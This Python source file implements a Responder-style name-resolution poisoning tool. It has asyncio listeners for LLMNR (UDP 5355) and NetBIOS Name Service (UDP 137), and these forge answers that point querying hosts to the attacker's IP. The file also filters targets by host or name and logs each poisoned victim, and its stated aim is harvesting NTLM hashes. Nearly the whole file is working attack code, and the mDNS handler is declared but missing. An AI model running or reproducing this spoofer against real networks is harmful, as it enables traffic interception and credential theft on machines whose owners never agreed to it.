"""LLMNR/NBT-NS/mDNS Poisoning - Responder-style credential harvesting.

Responds to broadcast name resolution queries to capture NTLMv1/v2 hashes.
"""

import asyncio
import socket
import struct
import logging
from enum import Enum, auto
from dataclasses import dataclass, field
from typing import Callable, Optional
from datetime import datetime

logger = logging.getLogger(__name__)


class PoisonType(Enum):
    """Supported poisoning protocols."""
    LLMNR = auto()      # Link-Local Multicast Name Resolution (UDP 5355)
    NBNS = auto()       # NetBIOS Name Service (UDP 137)
    MDNS = auto()       # Multicast DNS (UDP 5353)


@dataclass
class PoisonedQuery:
    """Captured poisoned query details."""
    timestamp: datetime
    poison_type: PoisonType
    query_name: str
    source_ip: str
    source_port: int
    our_response_ip: str


@dataclass
class ResponderConfig:
    """Responder server configuration."""
    interface: str = "eth0"
    response_ip: Optional[str] = None  # Auto-detect if None
    enable_llmnr: bool = True
    enable_nbns: bool = True
    enable_mdns: bool = False  # Disabled by default (noisy)
    analyze_only: bool = False  # Don't respond, just log
    
    # Filtering
    target_hosts: list[str] = field(default_factory=list)  # Empty = all
    ignore_hosts: list[str] = field(default_factory=list)
    target_names: list[str] = field(default_factory=list)  # Empty = all


class LLMNRHandler:
    """LLMNR (UDP 5355) query handler."""
    
    LLMNR_ADDR = "224.0.0.252"
    LLMNR_PORT = 5355
    
    def __init__(self, response_ip: str, callback: Callable[[PoisonedQuery], None]):
        self.response_ip = response_ip
        self.callback = callback
        self._socket: Optional[socket.socket] = None
        self._running = False
    
    def _parse_query(self, data: bytes) -> Optional[str]:
        """Parse LLMNR query and extract requested name."""
        try:
            if len(data) < 12:
                return None
            
            # Skip header (12 bytes), get question
            pos = 12
            name_parts = []
            
            while pos < len(data):
                length = data[pos]
                if length == 0:
                    break
                pos += 1
                name_parts.append(data[pos:pos + length].decode('utf-8', errors='ignore'))
                pos += length
            
            return '.'.join(name_parts) if name_parts else None
        except Exception:
            return None
    
    def _build_response(self, query_data: bytes, response_ip: str) -> bytes:
        """Build LLMNR response packet."""
        # Copy transaction ID from query
        txn_id = query_data[:2]
        
        # Response flags: QR=1, AA=1
        flags = b'\x80\x00'
        
        # Counts: 1 question, 1 answer
        counts = b'\x00\x01\x00\x01\x00\x00\x00\x00'
        
        # Copy question section
        question_end = 12
        while query_data[question_end] != 0:
            question_end += query_data[question_end] + 1
        question_end += 5  # null + type + class
        question = query_data[12:question_end]
        
        # Answer: pointer to name + type A + class IN + TTL + IP
        answer = b'\xc0\x0c'  # Pointer to offset 12 (name)
        answer += b'\x00\x01'  # Type A
        answer += b'\x00\x01'  # Class IN
        answer += b'\x00\x00\x00\x1e'  # TTL 30 seconds
        answer += b'\x00\x04'  # Data length
        answer += socket.inet_aton(response_ip)
        
        return txn_id + flags + counts + question + answer
    
    async def start(self) -> None:
        """Start LLMNR listener."""
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._socket.setblocking(False)
        
        try:
            self._socket.bind(('', self.LLMNR_PORT))
            
            # Join multicast group
            mreq = struct.pack("4sl", socket.inet_aton(self.LLMNR_ADDR), socket.INADDR_ANY)
            self._socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
            
            self._running = True
            logger.info(f"LLMNR listener started on port {self.LLMNR_PORT}")
            
            loop = asyncio.get_event_loop()
            
            while self._running:
                try:
                    data, addr = await asyncio.wait_for(
                        loop.sock_recvfrom(self._socket, 1024),
                        timeout=1.0
                    )
                    await self._handle_query(data, addr)
                except asyncio.TimeoutError:
                    continue
                except Exception as e:
                    if self._running:
                        logger.error(f"LLMNR error: {e}")
                        
        finally:
            if self._socket:
                self._socket.close()
    
    async def _handle_query(self, data: bytes, addr: tuple[str, int]) -> None:
        """Handle incoming LLMNR query."""
        name = self._parse_query(data)
        if not name:
            return
        
        source_ip, source_port = addr
        logger.info(f"[LLMNR] Query for '{name}' from {source_ip}:{source_port}")
        
        # Build and send response
        response = self._build_response(data, self.response_ip)
        
        loop = asyncio.get_event_loop()
        await loop.sock_sendto(self._socket, response, addr)
        
        # Callback with captured query
        query = PoisonedQuery(
            timestamp=datetime.now(),
            poison_type=PoisonType.LLMNR,
            query_name=name,
            source_ip=source_ip,
            source_port=source_port,
            our_response_ip=self.response_ip
        )
        self.callback(query)
    
    def stop(self) -> None:
        """Stop LLMNR listener."""
        self._running = False


class NBNSHandler:
    """NetBIOS Name Service (UDP 137) query handler."""
    
    NBNS_PORT = 137
    
    def __init__(self, response_ip: str, callback: Callable[[PoisonedQuery], None]):
        self.response_ip = response_ip
        self.callback = callback
        self._socket: Optional[socket.socket] = None
        self._running = False
    
    def _decode_netbios_name(self, encoded: bytes) -> str:
        """Decode NetBIOS encoded name."""
        try:
            # NetBIOS names are encoded as pairs of characters
            decoded = []
            for i in range(0, len(encoded) - 1, 2):
                char = ((encoded[i] - 0x41) << 4) | (encoded[i + 1] - 0x41)
                if char > 0 and char < 128:
                    decoded.append(chr(char))
            return ''.join(decoded).strip()
        except Exception:
            return ""
    
    def _build_response(self, query_data: bytes, response_ip: str) -> bytes:
        """Build NBNS response packet."""
        # Transaction ID
        txn_id = query_data[:2]
        
        # Response flags
        flags = b'\x85\x00'
        
        # Counts
        counts = b'\x00\x00\x00\x01\x00\x00\x00\x00'
        
        # Answer section
        name = query_data[12:46]  # 34 bytes encoded name
        answer = name
        answer += b'\x00\x20\x00\x01'  # Type NB, Class IN
        answer += b'\x00\x00\x00\xa5'  # TTL
        answer += b'\x00\x06'  # Data length
        answer += b'\x00\x00'  # Flags
        answer += socket.inet_aton(response_ip)
        
        return txn_id + flags + counts + answer
    
    async def start(self) -> None:
        """Start NBNS listener."""
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._socket.setblocking(False)
        
        try:
            self._socket.bind(('', self.NBNS_PORT))
            self._running = True
            logger.info(f"NBNS listener started on port {self.NBNS_PORT}")
            
            loop = asyncio.get_event_loop()
            
            while self._running:
                try:
                    data, addr = await asyncio.wait_for(
                        loop.sock_recvfrom(self._socket, 1024),
                        timeout=1.0
                    )
                    await self._handle_query(data, addr)
                except asyncio.TimeoutError:
                    continue
                except Exception as e:
                    if self._running:
                        logger.error(f"NBNS error: {e}")
                        
        finally:
            if self._socket:
                self._socket.close()
    
    async def _handle_query(self, data: bytes, addr: tuple[str, int]) -> None:
        """Handle incoming NBNS query."""
        if len(data) < 50:
            return
        
        # Extract and decode name (bytes 13-46)
        encoded_name = data[13:45]
        name = self._decode_netbios_name(encoded_name)
        
        if not name:
            return
        
        source_ip, source_port = addr
        logger.info(f"[NBNS] Query for '{name}' from {source_ip}:{source_port}")
        
        # Build and send response
        response = self._build_response(data, self.response_ip)
        
        loop = asyncio.get_event_loop()
        await loop.sock_sendto(self._socket, response, addr)
        
        # Callback
        query = PoisonedQuery(
            timestamp=datetime.now(),
            poison_type=PoisonType.NBNS,
            query_name=name,
            source_ip=source_ip,
            source_port=source_port,
            our_response_ip=self.response_ip
        )
        self.callback(query)
    
    def stop(self) -> None:
        """Stop NBNS listener."""
        self._running = False


class ResponderServer:
    """Main Responder server managing all poisoning protocols."""
    
    def __init__(self, config: Optional[ResponderConfig] = None):
        self.config = config or ResponderConfig()
        self._handlers: list = []
        self._queries: list[PoisonedQuery] = []
        self._running = False
        self._tasks: list[asyncio.Task] = []
        self._on_query_callback: Optional[Callable[[PoisonedQuery], None]] = None
    
    def _get_local_ip(self) -> str:
        """Get local IP address for the configured interface."""
        try:
            # Try to get IP from interface
            import subprocess
            result = subprocess.run(
                ['ip', 'addr', 'show', self.config.interface],
                capture_output=True, text=True
            )
            for line in result.stdout.split('\n'):
                if 'inet ' in line:
                    return line.split()[1].split('/')[0]
        except Exception:
            pass
        
        # Fallback: connect to external and get local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "0.0.0.0"
    
    def _handle_query(self, query: PoisonedQuery) -> None:
        """Handle captured query."""
        # Check filters
        if self.config.ignore_hosts and query.source_ip in self.config.ignore_hosts:
            return
        
        if self.config.target_hosts and query.source_ip not in self.config.target_hosts:
            return
        
        if self.config.target_names:
            name_lower = query.query_name.lower()
            if not any(t.lower() in name_lower for t in self.config.target_names):
                return
        
        self._queries.append(query)
        
        if self._on_query_callback:
            self._on_query_callback(query)
        
        logger.info(
            f"[{query.poison_type.name}] Poisoned '{query.query_name}' "
            f"from {query.source_ip} -> {query.our_response_ip}"
        )
    
    def on_query(self, callback: Callable[[PoisonedQuery], None]) -> None:
        """Set callback for captured queries."""
        self._on_query_callback = callback
    
    async def start(self) -> None:
        """Start all enabled poisoning handlers."""
        response_ip = self.config.response_ip or self._get_local_ip()
        logger.info(f"Responder starting with response IP: {response_ip}")
        
        self._running = True
        
        if self.config.enable_llmnr:
            handler = LLMNRHandler(response_ip, self._handle_query)
            self._handlers.append(handler)
            self._tasks.append(asyncio.create_task(handler.start()))
        
        if self.config.enable_nbns:
            handler = NBNSHandler(response_ip, self._handle_query)
            self._handlers.append(handler)
            self._tasks.append(asyncio.create_task(handler.start()))
        
        logger.info("Responder server started")
    
    async def stop(self) -> None:
        """Stop all handlers."""
        self._running = False
        
        for handler in self._handlers:
            handler.stop()
        
        for task in self._tasks:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        
        self._handlers.clear()
        self._tasks.clear()
        logger.info("Responder server stopped")
    
    @property
    def queries(self) -> list[PoisonedQuery]:
        """Get all captured queries."""
        return self._queries.copy()
    
    @property
    def is_running(self) -> bool:
        """Check if server is running."""
        return self._running
    
    def clear_queries(self) -> None:
        """Clear captured queries."""
        self._queries.clear()

